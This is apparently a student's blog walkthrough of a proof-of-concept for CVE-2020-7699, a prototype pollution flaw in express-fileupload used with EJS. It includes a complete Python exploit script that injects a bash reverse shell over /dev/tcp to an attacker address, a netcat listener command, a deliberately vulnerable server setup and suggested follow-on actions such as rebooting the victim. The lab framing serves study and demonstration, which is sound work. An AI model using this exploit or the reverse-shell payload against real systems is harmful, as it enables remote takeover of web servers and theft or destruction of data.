&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--yXZ4G6TC--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://raw.githubusercontent.com/boiledsteak/EJS-Exploit/main/screenshots/github.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--yXZ4G6TC--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://raw.githubusercontent.com/boiledsteak/EJS-Exploit/main/screenshots/github.png" alt="security warning of express-fileupload"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;This exploit was referenced from: &lt;a href="https://blog.p6.is/Real-World-JS-1/"&gt;https://blog.p6.is/Real-World-JS-1/&lt;/a&gt;&lt;br&gt;
^The author explains why the outdated dependency is vulnerable.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;&lt;strong&gt;Disclaimer: I am a security student with no professional programming / software engineer experience so my code may not be following best practices...but they work&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;h1&gt;
  &lt;a href="#contents"&gt;
  &lt;/a&gt;
  Contents &lt;a&gt;&lt;/a&gt;
&lt;/h1&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href="#Abstract"&gt;Abstract&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;
&lt;a href="#Set%20Up"&gt;Set Up&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href="#Attacker"&gt;Attacker&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#Victim"&gt;Victim&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#Launch%20Attack"&gt;Launch Attack&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;
&lt;a href="#Risk"&gt;Risk&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href="#Likelihood"&gt;Likelihood&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#Impact"&gt;Impact&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;
  &lt;a href="#abstract"&gt;
  &lt;/a&gt;
  Abstract &lt;a&gt;&lt;/a&gt;
&lt;/h1&gt;

&lt;div class="table-wrapper-paragraph"&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;CVE Code&lt;/td&gt;
&lt;td&gt;CVE-2020-7699&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;CWE Code&lt;/td&gt;
&lt;td&gt;CWE-400&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Publish Date&lt;/td&gt;
&lt;td&gt;30 July 2020&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Attack Type&lt;/td&gt;
&lt;td&gt;Remote Code Execution&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Vulnerability&lt;/td&gt;
&lt;td&gt;JavaScript Prototype Pollution&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Cause&lt;/td&gt;
&lt;td&gt;Misconfiguration?&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Fix&lt;/td&gt;
&lt;td&gt;Update Libraries, Proper Network Configuration, Firewalls&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Affected Technology&lt;/td&gt;
&lt;td&gt;Node, Express, express-fileupload v1.1.10 and earlier , EJS&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;&lt;/div&gt;

&lt;p&gt;&lt;a href="#contents"&gt;🚀 back to contents&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;
  &lt;a href="#set-up"&gt;
  &lt;/a&gt;
  Set Up &lt;a&gt;&lt;/a&gt;
&lt;/h1&gt;

&lt;p&gt;All files needed can be found in my github repository. Higher resolution version of all images used can be found in there too.&lt;br&gt;
&lt;/p&gt;
&lt;div class="ltag-github-readme-tag"&gt;
  &lt;div class="readme-overview"&gt;
    &lt;h2&gt;
      &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--i3JOwpme--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev.to/assets/github-logo-ba8488d21cd8ee1fee097b8410db9deaa41d0ca30b004c0c63de0a479114156f.svg" alt="GitHub logo"&gt;
      &lt;a href="https://github.com/boiledsteak"&gt;
        boiledsteak
      &lt;/a&gt; / &lt;a href="https://github.com/boiledsteak/EJS-Exploit"&gt;
        EJS-Exploit
      &lt;/a&gt;
    &lt;/h2&gt;
    &lt;h3&gt;
      Remote Code Execution EJS Web Applications using express-fileupload
    &lt;/h3&gt;
  &lt;/div&gt;
&lt;/div&gt;


&lt;h2&gt;
  &lt;a href="#attacker"&gt;
  &lt;/a&gt;
  Attacker &lt;a&gt;&lt;/a&gt;
&lt;/h2&gt;

&lt;p&gt;First, set up a Kali Virtual Machine (VM). Ensure all commands are run in bash. Check that Python3 is installed.&lt;/p&gt;

&lt;p&gt;Move this file into the kali VM&lt;br&gt;
&lt;strong&gt;EJS-RCE-attack.py&lt;/strong&gt; (can be found in my github repo)&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight python"&gt;&lt;code&gt;&lt;span class="c1"&gt;##############################################################
# Run this .py to perform EJS-RCE attack
# referenced from
# https://blog.p6.is/Real-World-JS-1/
# 
# Timothy, 10 November 2020
##############################################################
&lt;/span&gt;
&lt;span class="c1"&gt;### imports
&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;requests&lt;/span&gt;

&lt;span class="c1"&gt;### commands to run on victim machine
&lt;/span&gt;&lt;span class="n"&gt;cmd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;'bash -c "bash -i &amp;amp;&amp;gt; /dev/tcp/192.168.98.11/8020 0&amp;gt;&amp;amp;1"'&lt;/span&gt;

&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"Starting Attack..."&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;### pollute
&lt;/span&gt;&lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;'http://192.168.98.10:8080'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;files&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s"&gt;'__proto__.outputFunctionName'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
    &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="sa"&gt;f&lt;/span&gt;&lt;span class="s"&gt;"x;console.log(1);process.mainModule.require('child_process').exec('&lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="n"&gt;cmd&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s"&gt;');x"&lt;/span&gt;&lt;span class="p"&gt;)})&lt;/span&gt;

&lt;span class="c1"&gt;### execute command
&lt;/span&gt;&lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;'http://192.168.98.10:8080'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"Finished!"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Yes I know a docker would have been lighter than a VM but the purpose of this POC is more for demonstration so having a VM makes the process more visual.&lt;/p&gt;

&lt;p&gt;Next, modify &lt;strong&gt;EJS-RCE-attack.py&lt;/strong&gt; to fit attacker’s machine address and port. Line 13, change&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;/dev/tcp/192.168.98.11/8020
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;to&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;/dev/tcp/&amp;lt;attacker’s IP address&amp;gt;/&amp;lt;attacker’s port to listen for connection from victim&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;You could leave it at port 8020. Just ensure that no firewall rules are blocking the ports you use.&lt;/p&gt;

&lt;p&gt;Modify &lt;strong&gt;EJS-RCE-attack.py&lt;/strong&gt; to fit victim’s machine address and port. Line 17 and line 21. Change http address to victim’s web address.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--JZCFVStV--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://raw.githubusercontent.com/boiledsteak/EJS-Exploit/main/screenshots/changing-address.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--JZCFVStV--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://raw.githubusercontent.com/boiledsteak/EJS-Exploit/main/screenshots/changing-address.png" alt="screenshot of code"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="#contents"&gt;🚀 back to contents&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#victim"&gt;
  &lt;/a&gt;
  Victim &lt;a&gt;&lt;/a&gt;
&lt;/h2&gt;

&lt;p&gt;This part requires a bit more preparation since you will need to set up an EJS web server. There's many detailed guides online about EJS and how to create a web app with it so I won't detail everything in this post. I'll briefly list the steps needed to get one running.&lt;/p&gt;

&lt;p&gt;First, set up an Ubuntu VM. Ensure it can 'talk' to the Kali VM. Install NodeJS and NPM.&lt;/p&gt;

&lt;p&gt;Create a directory to contain the webserver code. It should look something like the screenshot below. For now just create the folders. Don't create the files yet. This step is optional but I feel it makes the webserver cleaner and easier to navigate. This step is useful if you choose to expand on my attack scenario for instance, adding a database to the webserver, adding multiple web pages etc...&lt;/p&gt;

&lt;p&gt;btw command to print directory tree in windows is&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;tree /A
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--jGPojmKV--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://raw.githubusercontent.com/boiledsteak/EJS-Exploit/main/screenshots/webserver-tree.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--jGPojmKV--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://raw.githubusercontent.com/boiledsteak/EJS-Exploit/main/screenshots/webserver-tree.png" alt="screenshot of directory tree"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Okay first file to create is &lt;strong&gt;package.json&lt;/strong&gt;. Move it to backend as pictured in the directory tree screenshot. (all files can be found in my github repo)&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight json"&gt;&lt;code&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;
  &lt;/span&gt;&lt;span class="nl"&gt;"name"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"some-website"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt;
  &lt;/span&gt;&lt;span class="nl"&gt;"version"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"1.0.0"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt;
  &lt;/span&gt;&lt;span class="nl"&gt;"description"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;""&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt;
  &lt;/span&gt;&lt;span class="nl"&gt;"main"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"server.js"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt;
  &lt;/span&gt;&lt;span class="nl"&gt;"scripts"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;
    &lt;/span&gt;&lt;span class="nl"&gt;"start"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"node server.js"&lt;/span&gt;&lt;span class="w"&gt;
  &lt;/span&gt;&lt;span class="p"&gt;},&lt;/span&gt;&lt;span class="w"&gt;
  &lt;/span&gt;&lt;span class="nl"&gt;"author"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;""&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt;
  &lt;/span&gt;&lt;span class="nl"&gt;"license"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"ISC"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt;
  &lt;/span&gt;&lt;span class="nl"&gt;"dependencies"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;
    &lt;/span&gt;&lt;span class="nl"&gt;"ejs"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"^3.1.5"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt;
    &lt;/span&gt;&lt;span class="nl"&gt;"express"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"^4.17.1"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt;
    &lt;/span&gt;&lt;span class="nl"&gt;"express-fileupload"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"^1.1.7-alpha.3"&lt;/span&gt;&lt;span class="w"&gt;
  &lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;open a terminal in the backend folder and run&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;npm &lt;span class="nb"&gt;install&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;This installs all needed libraries and dependencies including EJS. A "node_modules" folder should appear.&lt;/p&gt;

&lt;p&gt;Now, write the server code &lt;strong&gt;server.js&lt;/strong&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="c1"&gt;// web server code&lt;/span&gt;
&lt;span class="c1"&gt;// website starts here&lt;/span&gt;

&lt;span class="c1"&gt;// imports&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;express&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;require&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;express&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;fileupload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;require&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;express-fileupload&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;http&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;require&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;http&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;app&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;express&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;

&lt;span class="nx"&gt;app&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;use&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;fileupload&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt; &lt;span class="na"&gt;parseNested&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt; &lt;span class="p"&gt;}));&lt;/span&gt;
&lt;span class="c1"&gt;// set the view engine to ejs&lt;/span&gt;
&lt;span class="nx"&gt;app&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="kd"&gt;set&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;view engine&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;ejs&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="nx"&gt;app&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="kd"&gt;set&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;views&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;../frontend/pages&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="nx"&gt;app&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="kd"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;/&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;req&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
   &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;render&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;index&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;});&lt;/span&gt;



&lt;span class="c1"&gt;// sever starting ...&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;server&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;http&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;Server&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;app&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;addr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;192.168.98.10&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;port&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;8080&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="nx"&gt;server&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;listen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;port&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;addr&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;Server listening on &lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nx"&gt;addr&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt; port &lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nx"&gt;port&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
 &lt;span class="p"&gt;});&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;You'll need to change the "addr" variable in line 24 to match your victim machine's IP address.&lt;/p&gt;

&lt;p&gt;Next, create a simple HTML page in frontend/pages. It needs to be an .ejs file. I created a very plain one &lt;strong&gt;index.ejs&lt;/strong&gt;. This is to show that this attack does not require the victim to click anything on the website. The vulnerability lies in an outdated dependency used. No XSS needed. I probably don't need to show the code but here it is lol.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight html"&gt;&lt;code&gt;&lt;span class="cp"&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;title&amp;gt;&lt;/span&gt;Some Website&lt;span class="nt"&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;This is some website&lt;span class="nt"&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;a href="#contents"&gt;🚀 back to contents&lt;/a&gt;&lt;/p&gt;

&lt;h1&gt;
  &lt;a href="#launch-attack"&gt;
  &lt;/a&gt;
  Launch Attack &lt;a&gt;&lt;/a&gt;
&lt;/h1&gt;

&lt;p&gt;With everything set up, you can finally launch the attack. First, start the web server from the victim machine. Run npm start in the backend directory where the server.js file is located.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--gjvBnZh1--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://raw.githubusercontent.com/boiledsteak/EJS-Exploit/main/screenshots/start-webserver.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--gjvBnZh1--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://raw.githubusercontent.com/boiledsteak/EJS-Exploit/main/screenshots/start-webserver.png" alt="screenshot of npm start"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Now on the attacker side start a nc to listen for a connection from the victim.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;nc &lt;span class="nt"&gt;-lvp&lt;/span&gt; 8020
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Then start the actual exploit&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;python3 EJS-RCE-attack.py
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--YGUQ14ZN--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://raw.githubusercontent.com/boiledsteak/EJS-Exploit/main/screenshots/attacker-exploiting.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--YGUQ14ZN--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://raw.githubusercontent.com/boiledsteak/EJS-Exploit/main/screenshots/attacker-exploiting.png" alt="screenshot of terminal"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;If everything is done properly, you should be seeing a shell of the victim, on the attacker's terminal. From here you can do all kinds of commands to demonstrate RCE. You could do a simple DOS by restarting the machine with init 6. Or maybe do something even more 'hackerman' by downloading a MSFvenom and opening a metasploit shell.&lt;/p&gt;

&lt;p&gt;That's all to the attack. It's actually very simple. As I said at the start, this is just a simple RCE POC to show that misconfiguration can lead to severe vulnerabilities. The victim doesn't even need to click anything on the website and yet the web server can be compromised.&lt;/p&gt;

&lt;p&gt;&lt;a href="#contents"&gt;🚀 back to contents&lt;/a&gt;&lt;/p&gt;

&lt;h1&gt;
  &lt;a href="#risk"&gt;
  &lt;/a&gt;
  Risk
&lt;/h1&gt;

&lt;p&gt;As defined by the &lt;a href="https://owasp.org/www-project-risk-assessment-framework/"&gt;OWASP risk rating methodology&lt;/a&gt;, the risk of a vulnerability is measured by its likelihood and impact.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#likelihood"&gt;
  &lt;/a&gt;
  Likelihood
&lt;/h2&gt;

&lt;p&gt;The likelihood of this exploit happening is extremely low because it relies on an outdated version of express-fileupload. The github repo that maintains this dependency even has a security warning about this exploit. Moreover EJS is not usually used in production. React, Angular , Vue, these are some of the more popular javascript frontend frameworks. EJS is used more for learning and development.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Thus I would give this a Low likelihood rating of 1/3&lt;/strong&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#impact"&gt;
  &lt;/a&gt;
  Impact
&lt;/h2&gt;

&lt;p&gt;Since this is a RCE exploit, the impact is very high. RCE can enable all sorts of attacks. Stealing data, denial of service, opening backdoors, lateral movement - these are to name of but a few. Of course there are many effective ways to mitigate the impact of RCE such as firewalls, giving least privelege, port blocking etc. however the impact is still high.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Thus I would give this a High impact rating of 3/3&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;With low likelihood and high impact, I rate this exploit as a &lt;strong&gt;Medium Risk&lt;/strong&gt;&lt;br&gt;
